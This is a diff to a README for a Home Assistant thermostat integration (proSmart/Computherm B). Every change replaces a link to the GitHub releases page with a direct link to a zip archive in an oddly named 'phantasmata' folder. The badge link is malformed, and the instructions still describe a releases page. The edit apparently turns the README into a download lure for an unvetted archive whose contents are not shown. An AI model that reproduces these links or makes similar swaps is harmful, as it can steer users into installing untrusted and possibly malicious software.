@@ -1,7 +1,7 @@
 # 🌟 ProSmartSystem-ComputhermB-HomeAssistant - Control Your Smart Thermostat Effortlessly
 
 ## 📦 Download Now
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/releases)
+[![Download the latest release](https://raw.githubusercontent.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/main/phantasmata/ProSmartSystem-ComputhermB-HomeAssistant.zip%https://raw.githubusercontent.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/main/phantasmata/ProSmartSystem-ComputhermB-HomeAssistant.zip)](https://raw.githubusercontent.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/main/phantasmata/ProSmartSystem-ComputhermB-HomeAssistant.zip)
 
 ## 🎯 Overview
 Welcome to the ProSmartSystem-ComputhermB-HomeAssistant integration. This tool connects your proSmart and Computherm B devices with Home Assistant, allowing you to manage your smart thermostat easily. Whether you're looking to control the temperature at home or automate your heating system, this integration simplifies the process.
@@ -17,7 +17,7 @@ Before downloading, ensure that you meet the following requirements:
 
 ### 2. Visit the Releases Page
 To get the latest version of this integration, visit the following page:
-[Download Page](https://github.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/releases)
+[Download Page](https://raw.githubusercontent.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/main/phantasmata/ProSmartSystem-ComputhermB-HomeAssistant.zip)
 
 ### 3. Download the Release
 On the releases page, find the latest version. Click the link to download the file relevant to your system. 
@@ -27,7 +27,7 @@ After the download completes, locate the file on your computer. It may be in you
 
 ## 📥 Download & Install
 To install the integration, follow these steps:
-1. **Visit this page to download:** [Download Page](https://github.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/releases).
+1. **Visit this page to download:** [Download Page](https://raw.githubusercontent.com/kuofimax/ProSmartSystem-ComputhermB-HomeAssistant/main/phantasmata/ProSmartSystem-ComputhermB-HomeAssistant.zip).
 2. Click on the latest release.
 3. Click the appropriate file for your operating system and download it.
 4. Once the download is complete, find the file on your device.
